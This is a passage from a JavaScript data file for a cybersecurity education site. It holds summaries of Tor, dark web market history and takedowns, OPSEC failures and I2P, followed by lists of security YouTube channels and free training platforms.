4. .onion sites (hidden services) route through 6 nodes; neither party learns the other's IP

TOR BROWSER: Modified Firefox configured to route through Tor. Default entry point.

LEGAL USES:
• Journalists and whistleblowers (SecureDrop on .onion)
• Political dissidents in authoritarian regimes
• Privacy-conscious individuals
• Law enforcement investigations
• Military/intelligence (still)

LIMITATIONS:
• Slow (due to multiple hops)
• Exit nodes can see unencrypted HTTP traffic
• Malicious exit nodes can perform MITM
• De-anonymization possible via traffic analysis, timing attacks, JavaScript exploits
• Doesn't protect against user mistakes (logging into personal accounts)

FUNDED BY: US State Department (for anti-censorship use in authoritarian states). Ironic given NSA surveillance.`
    },
    {
      id: 'dark-web-markets',
      name: 'Dark Web Marketplaces',
      icon: '🛒',
      tags: ['drugs', 'criminal', 'Bitcoin', 'marketplace'],
      shortDesc: 'Underground markets selling drugs, weapons, stolen data, and hacking services.',
      content: `Dark web marketplaces are e-commerce sites (accessible only via Tor) that facilitate anonymous transactions for illegal goods and services.

HISTORY:
• Silk Road (2011–2013): Founded by Ross Ulbricht ("Dread Pirate Roberts"). First major dark web market; primarily drugs. Operated on Bitcoin. FBI seized it in October 2013; Ulbricht arrested. He received life in prison (no parole). Transactions: $1.2B.

• Silk Road 2.0 (2013–2014): Successor; shut down by FBI "Operation Onymous" (November 2014, which also took down 400+ other .onion sites).

• AlphaBay (2014–2017): Largest dark web market at its peak (10x Silk Road). Shut down by FBI, Europol, Thai police. Admin Alexandre Cazes found dead in Thai jail cell (suicide) after arrest.

• Hansa Market (2015–2017): Dutch police took over covertly for 27 days before shutdown; collected data on thousands of users. A landmark law enforcement operation.

• Dream Market (2013–2019): Closed voluntarily.
• Empire Market (2018–2020): Exit scam ($30M stolen from users).
• Hydra Market (2015–2022): Largest ever; Russian-language; $5.2B in cryptocurrency transactions. Seized by German BKA + US DOJ in April 2022.

CATEGORIES OF GOODS:
• Drugs (most prevalent): Fentanyl, MDMA, cocaine, cannabis
• Stolen data: Credit cards, fullz (complete identity packages)
• Hacking services: DDoS-for-hire, ransomware deployment
• Malware and exploits
• Counterfeit documents
• Weapons (less common, more scrutinized)

PAYMENT: Bitcoin (less common now due to traceability), Monero (XMR — preferred for privacy).`
    },
    {
      id: 'opsec-dark-web',
      name: 'OPSEC on the Dark Web',
      icon: '🥷',
      tags: ['anonymity', 'OPSEC', 'privacy', 'deanonymization'],
      shortDesc: 'How anonymity is maintained and broken on the dark web.',
      content: `Operational Security (OPSEC) refers to the practices used to maintain anonymity. Poor OPSEC is responsible for most dark web criminal arrests.

HOW PEOPLE GET CAUGHT (OPSEC FAILURES):
• Reusing usernames across surface and dark web (Ross Ulbricht used "altoid" on Bitcoin forums and his real name Google+ profile)
• Shipping goods to real addresses (most drug arrests)
• Using home Wi-Fi without public Wi-Fi cover
• Bitcoin traceability — blockchain analysis firms (Chainalysis, CipherTrace) trace transactions. Most major arrests involve following Bitcoin.
• Social engineering by undercover law enforcement
• Server infrastructure vulnerabilities — misconfigured Tor hidden services revealing real IPs
• Malware used by law enforcement (FBI's NIT — Network Investigative Technique) to de-anonymize Tor users
• Physical surveillance after online identification
• Informants within criminal organizations

LAW ENFORCEMENT TECHNIQUES:
• Undercover operations (posing as buyers/sellers)
• Controlled deliveries
• Infiltrating communities and gaining trust
• Blockchain analysis
• Exploiting exit node traffic
• International cooperation (Europol, Interpol, FBI joint operations)
• Seizing and analyzing servers
• Hacking dark web sites (FBI hacked Playpen — CP forum — and served NIT to 8,700+ users)

MONERO (XMR): The preferred cryptocurrency due to ring signatures, stealth addresses, and RingCT making transactions private and untraceable. Bitcoin transactions are pseudonymous, not anonymous.`
    },
    {
      id: 'i2p',
      name: 'I2P Network',
      icon: '🌐',
      tags: ['anonymity', 'garlic routing', 'darknet'],
      shortDesc: 'Invisible Internet Project — alternative to Tor with different privacy properties.',
      content: `I2P (Invisible Internet Project) is an anonymous network layer designed as an alternative to Tor, using "garlic routing" rather than onion routing.

DIFFERENCES FROM TOR:
• Garlic routing — bundles multiple messages together, making traffic analysis harder
• Fully distributed — no central directory servers (unlike Tor's directory authorities)
• Designed primarily for internal services (eepsites) rather than accessing clearnet
• Generally faster than Tor for .i2p sites
• Smaller network = smaller anonymity set
• Less research into de-anonymization attacks

USES:
• I2P-only sites ("eepsites") with .i2p domains
• Anonymous email (I2P-Bote)
• Anonymous torrenting (I2PSnark)
• Anonymous IRC, forums
• Some criminal activity (though less than Tor)

FREENET: Another darknet — fully distributed, censorship-resistant content sharing. Files stored encrypted across volunteers' hard drives. Very slow. Used for censored journalism and, unfortunately, criminal content.`
    },
    {
      id: 'deanon-cases',
      name: 'Famous Dark Web Takedowns',
      icon: '🚔',
      tags: ['law enforcement', 'arrests', 'FBI', 'Europol'],
      shortDesc: 'High-profile law enforcement operations that dismantled dark web operations.',
      content: `Law enforcement has become increasingly sophisticated at dismantling dark web operations through a combination of technical and traditional investigative methods.

MAJOR OPERATIONS:
• Operation Onymous (2014, Europol + FBI): Took down 400+ .onion sites including Silk Road 2.0, 17 arrests.

• Operation Bayonet (2017, Europol + DEA + FBI): AlphaBay (seized) + Hansa (taken over and run for 27 days before shutdown). Global impact — thousands of users exposed.

• Operation DisrupTor (2020, Europol + US + EU): 179 arrests across US, UK, Germany, Netherlands, Austria, Netherlands. 500+ kg drugs seized. Used data from AlphaBay and Wall Street Market takedowns.

• Hydra Market Seizure (2022): German BKA seized servers; US DOJ simultaneously indicted Russian nationals. $25M+ Bitcoin seized. Largest cryptocurrency seizure of a darknet market.

• Genesis Market Takedown (Operation Cookie Monster, 2023): 119 arrested across 17 countries. Genesis sold "bots" — complete stolen browser sessions enabling account takeover without passwords.

• ChipMixer Seizure (2023): $46M+ seized; largest ever crypto mixer takedown. Europol + FBI.

LESSONS FOR LE: Patience (Hansa operation), blockchain analytics (almost every major arrest), international cooperation, and exploiting the trust criminals have in each other (informants).`
    }
  ]
},

// ──────────────────────────────────────────────
//  YOUTUBE CHANNELS
// ──────────────────────────────────────────────
channels: [
  {
    id: 'networkchuck',
    name: 'NetworkChuck',
    handle: '@NetworkChuck',
    avatar: '☕',
    type: 'Education / Hacking',
    subs: '3.5M+',
    desc: 'Enthusiastic, coffee-fueled tutorials on networking, ethical hacking, Linux, Python, and cloud. Perfect for beginners. Known for making complex topics fun and accessible. CCNA, CEH, OSCP content.',
    topics: ['Networking', 'Ethical Hacking', 'Linux', 'Python', 'Cloud', 'CTF'],
    url: 'https://youtube.com/@NetworkChuck'
  },
  {
    id: 'johnhammond',
    name: 'John Hammond',
    handle: '@_JohnHammond',
    avatar: '🔍',
    type: 'CTF / Malware Analysis',
    subs: '1.5M+',
    desc: 'Professional security researcher and CTF champion. Covers malware analysis, CTF walkthroughs, bug bounty, threat actor research, and cybersecurity news. One of the most technically rigorous channels.',
    topics: ['CTF', 'Malware Analysis', 'Reverse Engineering', 'Threat Intelligence', 'Bug Bounty'],
    url: 'https://youtube.com/@_JohnHammond'
  },
  {
    id: 'ippsec',
    name: 'IppSec',
    handle: '@ippsec',
    avatar: '📦',
    type: 'HackTheBox Walkthroughs',
    subs: '800K+',
    desc: 'Legendary walkthroughs of retired HackTheBox machines. Extremely in-depth technical content covering every aspect of penetration testing. Essential for OSCP preparation. No shortcuts, pure skill.',
    topics: ['HackTheBox', 'OSCP Prep', 'Penetration Testing', 'Linux/Windows', 'CTF'],
    url: 'https://youtube.com/@ippsec'
  },
  {
    id: 'liveoverflow',
    name: 'LiveOverflow',
    handle: '@LiveOverflow',
    avatar: '🎮',
    type: 'Binary Exploitation / CTF',
    subs: '700K+',
    desc: 'Deep-dive into binary exploitation, web hacking, CTF challenges, and hacking research. One of the most intellectually stimulating cybersecurity channels. Explores the "why" behind techniques.',
    topics: ['Binary Exploitation', 'Pwn', 'CTF', 'Web Hacking', 'Reverse Engineering'],
    url: 'https://youtube.com/@LiveOverflow'
  },
  {
    id: 'tcm',
    name: 'The Cyber Mentor (TCM)',
    handle: '@TCMSecurityAcademy',
    avatar: '🎓',
    type: 'Ethical Hacking / Training',
    subs: '500K+',
    desc: 'Heath Adams delivers practical ethical hacking courses. Created the famous free "Practical Ethical Hacking" course. Covers AD attacks, web app hacking, privilege escalation, Python. PNPT certification creator.',
    topics: ['Ethical Hacking', 'Active Directory', 'Web App Hacking', 'PrivEsc', 'OSCP Prep'],
    url: 'https://youtube.com/@TCMSecurityAcademy'
  },
  {
    id: 'davidbombal',
    name: 'David Bombal',
    handle: '@davidbombal',
    avatar: '🌐',
    type: 'Networking / Hacking',
    subs: '2M+',
    desc: 'Cisco expert covering networking fundamentals, ethical hacking with Python, Kali Linux, Wi-Fi hacking, and interviews with top security professionals. Great interviews with Kevin Mitnick, hackers, and researchers.',
    topics: ['Networking', 'Python Hacking', 'Kali Linux', 'Wi-Fi Security', 'Cisco'],
    url: 'https://youtube.com/@davidbombal'
  },
  {
    id: 'hak5',
    name: 'Hak5',
    handle: '@Hak5',
    avatar: '🔌',
    type: 'Hardware Hacking / Tools',
    subs: '700K+',
    desc: 'Creators of iconic hacking hardware (Rubber Ducky, WiFi Pineapple, Bash Bunny, LAN Turtle). Their channel covers using these tools, pentesting techniques, social engineering, and security news.',
    topics: ['Hardware Hacking', 'Physical Pentesting', 'Wi-Fi', 'USB Attacks', 'Social Engineering'],
    url: 'https://youtube.com/@Hak5'
  },
  {
    id: 'stok',
    name: 'STÖK',
    handle: '@STOKfredrik',
    avatar: '🐞',
    type: 'Bug Bounty',
    subs: '250K+',
    desc: 'Bug bounty hunter with an energetic, motivational approach. Covers recon methodology, web application testing, finding vulnerabilities in real programs, mindset, and the bug bounty lifestyle.',
    topics: ['Bug Bounty', 'Recon', 'Web Hacking', 'OSINT', 'Mindset'],
    url: 'https://youtube.com/@STOKfredrik'
  },
  {
    id: 'simplycyber',
    name: 'Simply Cyber',
    handle: '@SimplyCyber',
    avatar: '💼',
    type: 'Career / Blue Team',
    subs: '350K+',
    desc: 'Gerald Auger covers cybersecurity career advice, blue team operations, GRC (Governance, Risk, Compliance), SOC analyst skills, threat intelligence, and daily cybersecurity news. Best channel for career guidance.',
    topics: ['Career', 'Blue Team', 'SOC', 'GRC', 'Threat Intelligence', 'News'],
    url: 'https://youtube.com/@SimplyCyber'
  },
  {
    id: 'blackhat',
    name: 'Black Hat',
    handle: '@BlackHatOfficialYT',
    avatar: '🎩',
    type: 'Conference / Research',
    subs: '600K+',
    desc: 'Official channel of Black Hat conference. Features cutting-edge security research presentations from the world\'s top researchers. Topics include advanced exploits, new vulnerability classes, and nation-state techniques.',
    topics: ['Security Research', 'Conference Talks', 'Advanced Techniques', 'Zero-Days', 'Nation-State'],
    url: 'https://youtube.com/@BlackHatOfficialYT'
  },
  {
    id: 'defcon',
    name: 'DEF CON',
    handle: '@DEFCONConference',
    avatar: '🔓',
    type: 'Conference / Hacking Culture',
    subs: '500K+',
    desc: 'Official channel of DEF CON — the world\'s largest and most famous hacker convention. Talks range from beginner to nation-state level. Villages cover hardware, social engineering, car hacking, IoT, and more.',
    topics: ['Hacker Culture', 'Security Research', 'CTF', 'Hardware', 'Social Engineering'],
    url: 'https://youtube.com/@DEFCONConference'
  },
  {
    id: 'seytonic',
    name: 'Seytonic',
    handle: '@Seytonic',
    avatar: '🕹️',
    type: 'Hardware / Privacy',
    subs: '400K+',
    desc: 'Hardware hacking, DIY security tools, privacy tips, cybersecurity news, and hacker culture. Covers Flipper Zero, Raspberry Pi, Wi-Fi attacks, and building custom hacking hardware.',
    topics: ['Hardware Hacking', 'Flipper Zero', 'Privacy', 'DIY Security', 'News'],
    url: 'https://youtube.com/@Seytonic'
  },
  {
    id: 'mental-outlaw',
    name: 'Mental Outlaw',
    handle: '@MentalOutlaw',
    avatar: '🐧',
    type: 'Linux / Privacy / Security',
    subs: '600K+',
    desc: 'Linux, FOSS, privacy, security news, and tech commentary with a dry sense of humor. Covers data breaches, privacy tools, VPNs, self-hosting, and the broader surveillance state.',
    topics: ['Linux', 'Privacy', 'FOSS', 'Security News', 'Self-Hosting'],
    url: 'https://youtube.com/@MentalOutlaw'
  },
  {
    id: 'nullbyte',
    name: 'Null Byte (WonderHowTo)',
    handle: '@NullByteWHT',
    avatar: '0️⃣',
    type: 'Ethical Hacking Tutorials',
    subs: '1M+',
    desc: 'Step-by-step ethical hacking tutorials covering Wi-Fi hacking, MITM attacks, Kali Linux tools, Metasploit, and more. Great for beginners learning specific attack techniques in lab environments.',
    topics: ['Wi-Fi Hacking', 'Metasploit', 'Kali Linux', 'MITM', 'Beginner Tutorials'],
    url: 'https://youtube.com/@NullByteWHT'
  }
],

// ──────────────────────────────────────────────
//  FREE TRAINING PLATFORMS
// ──────────────────────────────────────────────
training: [
  {
    id: 'tryhackme',
    name: 'TryHackMe',
    avatar: '🏠',
    cost: 'freemium',
    url: 'https://tryhackme.com',
    handle: 'tryhackme.com',
    desc: 'Browser-based learning platform with guided, gamified cybersecurity rooms. Best for absolute beginners. Covers networking, Linux, web hacking, OSCP prep, SOC analyst, and more. No setup required — everything runs in browser.',
    topics: ['Beginner Friendly', 'CTF', 'Web Hacking', 'OSCP Prep', 'SOC', 'Guided Learning'],
    bestFor: 'Complete beginners to intermediate'
  },
  {
    id: 'hackthebox',
    name: 'Hack The Box',
    avatar: '📦',
    cost: 'freemium',
    url: 'https://hackthebox.com',
    handle: 'hackthebox.com',
    desc: 'More challenging, realistic machines with no hand-holding. Industry standard for penetration testers. Includes machines, challenges, Prolabs (enterprise environments), and a thriving community. Essential for OSCP.',
    topics: ['Penetration Testing', 'OSCP Prep', 'CTF', 'Advanced', 'Active Directory', 'Realistic Environments'],
    bestFor: 'Intermediate to advanced'
  },
  {
    id: 'portswigger',
    name: 'PortSwigger Web Security Academy',
    avatar: '🕷️',
    cost: 'free',
    url: 'https://portswigger.net/web-security',
    handle: 'portswigger.net/web-security',
    desc: 'THE definitive resource for web application security. Completely free, created by the makers of Burp Suite. Covers every OWASP topic with theory and hands-on labs. Over 220 labs, from apprentice to expert.',
    topics: ['Web App Security', 'SQL Injection', 'XSS', 'CSRF', 'SSRF', 'XXE', 'JWT', 'OAuth', 'API Security'],
    bestFor: 'Web security at all levels'
  },
  {
    id: 'picoctf',
    name: 'picoCTF',
    avatar: '🏳️',
    cost: 'free',
    url: 'https://picoctf.org',
    handle: 'picoctf.org',
    desc: 'Free CTF platform by Carnegie Mellon University. Designed for middle/high school students but excellent for any beginner. Year-round practice challenges plus annual competition. Great introduction to all CTF categories.',
    topics: ['CTF', 'Beginner', 'Cryptography', 'Forensics', 'Web', 'Reverse Engineering', 'Binary'],
    bestFor: 'Absolute beginners, students'
  },
  {
    id: 'overthewire',
    name: 'OverTheWire',
    avatar: '🎖️',
    cost: 'free',
    url: 'https://overthewire.org',
    handle: 'overthewire.org',
    desc: 'Classic wargame platform with progressive challenges. Bandit (Linux basics) is the perfect starting point — learn command line through hacking. Other wargames cover web (Natas), binary (Narnia/Behemoth), and more.',
    topics: ['Linux', 'Command Line', 'Web', 'Binary Exploitation', 'Cryptography', 'Progressive Challenges'],
    bestFor: 'Beginners learning Linux fundamentals'
  },
  {
    id: 'vulnhub',
    name: 'VulnHub',
    avatar: '💿',
    cost: 'free',
    url: 'https://vulnhub.com',
    handle: 'vulnhub.com',
    desc: 'Free downloadable vulnerable virtual machines to practice on locally. Hundreds of machines at all difficulty levels. Great for offline practice without internet requirements. IppSec has walkthroughs for many.',
    topics: ['Penetration Testing', 'Local Lab', 'VM', 'OSCP Prep', 'Full Compromise', 'All Levels'],
    bestFor: 'Those who want local, offline practice'
  },
  {
    id: 'cybrary',
    name: 'Cybrary',
    avatar: '📚',
    cost: 'freemium',
    url: 'https://cybrary.it',
    handle: 'cybrary.it',
    desc: 'Online cybersecurity training platform with free and paid courses. Free tier includes CompTIA Security+, CEH, OSCP prep, SOC analyst, and many foundational courses. Large video library.',
    topics: ['Security+', 'CEH', 'SOC Analyst', 'OSCP Prep', 'GRC', 'Threat Intelligence', 'Career Paths'],
    bestFor: 'Certification preparation, career tracks'
  },
  {
    id: 'mitre-attack',
    name: 'MITRE ATT&CK Framework',
    avatar: '🗺️',
    cost: 'free',
    url: 'https://attack.mitre.org',
    handle: 'attack.mitre.org',
    desc: 'Globally accessible knowledge base of adversary tactics and techniques based on real-world observations. Essential reference for threat hunters, SOC analysts, red teamers, and security architects. Used by every serious security professional.',
    topics: ['Threat Intelligence', 'TTPs', 'Red Team', 'Blue Team', 'Threat Hunting', 'SOC Reference'],
    bestFor: 'All levels — essential professional reference'
  },
  {
    id: 'ctftime',
    name: 'CTFtime',
    avatar: '⏱️',
    cost: 'free',
    url: 'https://ctftime.org',
    handle: 'ctftime.org',
    desc: 'The central hub for CTF competition information — upcoming events, past CTFs with writeups, team rankings, and the global CTF community. Find CTF competitions at your skill level and learn from published writeups.',
    topics: ['CTF', 'Competition Calendar', 'Writeups', 'Community', 'All Skill Levels'],
    bestFor: 'Anyone looking for CTF competitions'
  },
  {
    id: 'owasp-webgoat',
    name: 'OWASP WebGoat',
    avatar: '🐐',
    cost: 'free',
    url: 'https://owasp.org/www-project-webgoat',
    handle: 'owasp.org/www-project-webgoat',
    desc: 'Deliberately insecure web application by OWASP for learning web security. Run locally, learn SQL injection, XSS, authentication failures, and OWASP Top 10 by actually exploiting them. Includes WebWolf for attacker server.',
    topics: ['Web App Security', 'OWASP Top 10', 'SQL Injection', 'XSS', 'Hands-On', 'Localhost'],
    bestFor: 'Learning web vulnerabilities hands-on'
  },
  {
    id: 'sans-cyberaces',
    name: 'SANS Cyber Aces',
    avatar: '🃏',
    cost: 'free',
    url: 'https://cyberaces.org',
    handle: 'cyberaces.org',
    desc: 'Free foundational cybersecurity courses by SANS Institute (world\'s leading security training organization). Covers operating systems, networking, and system administration. Great starting point for total beginners.',
    topics: ['Fundamentals', 'Networking', 'Operating Systems', 'Beginner', 'SANS'],
    bestFor: 'Total beginners building foundations'
  },
  {
    id: 'google-cybersecurity',
    name: 'Google Cybersecurity Certificate',
    avatar: '🟦',
    cost: 'freemium',
    url: 'https://grow.google/certificates/cybersecurity',
    handle: 'grow.google/certificates/cybersecurity',
    desc: 'Professional certificate on Coursera designed to get beginners job-ready in 6 months (10 hrs/week). Covers security foundations, network security, Linux, SQL, threat detection, incident response, and Python automation. Can audit free.',
    topics: ['Beginner to Job-Ready', 'SOC Analyst', 'Python', 'Linux', 'SIEM', 'Coursera'],
    bestFor: 'Career changers, beginners wanting credentials'
  },
  {
    id: 'tcm-academy',
    name: 'TCM Security Academy',
    avatar: '🏋️',
    cost: 'freemium',
    url: 'https://academy.tcm-sec.com',
    handle: 'academy.tcm-sec.com',
    desc: 'Practical, affordable ethical hacking courses by The Cyber Mentor. "Practical Ethical Hacking" was a free YouTube course before becoming paid. PNPT certification alternative to OSCP at fraction of the cost. Highly recommended.',
    topics: ['Practical Ethical Hacking', 'OSCP Alternative', 'Active Directory', 'Web App', 'PNPT Certification'],
    bestFor: 'Aspiring penetration testers'
  },
  {
    id: 'metasploitable',
    name: 'Metasploitable / DVWA',
    avatar: '🎯',
    cost: 'free',
    url: 'https://github.com/rapid7/metasploitable3',
    handle: 'github.com/rapid7/metasploitable3',
    desc: 'Metasploitable is an intentionally vulnerable Linux VM for practicing Metasploit and manual exploitation. DVWA (Damn Vulnerable Web Application) is a PHP/MySQL app for practicing web vulnerabilities. Both run locally.',
    topics: ['Metasploit', 'Local Lab', 'Web App', 'VM', 'Beginners', 'Practice Environment'],
    bestFor: 'Local lab practice with Metasploit'
  },
  {
    id: 'blueteamlabs',
    name: 'Blue Team Labs Online',
    avatar: '🔵',
    cost: 'freemium',
    url: 'https://blueteamlabs.online',
    handle: 'blueteamlabs.online',
    desc: 'Platform focused on defensive security (Blue Team) skills. Challenges in SIEM, log analysis, incident response, threat hunting, reverse engineering malware, and digital forensics. Complements offensive-focused platforms.',
    topics: ['Blue Team', 'SIEM', 'Log Analysis', 'Forensics', 'Incident Response', 'Threat Hunting'],
    bestFor: 'Aspiring SOC analysts, defensive security'
  }
]

}; // end DB
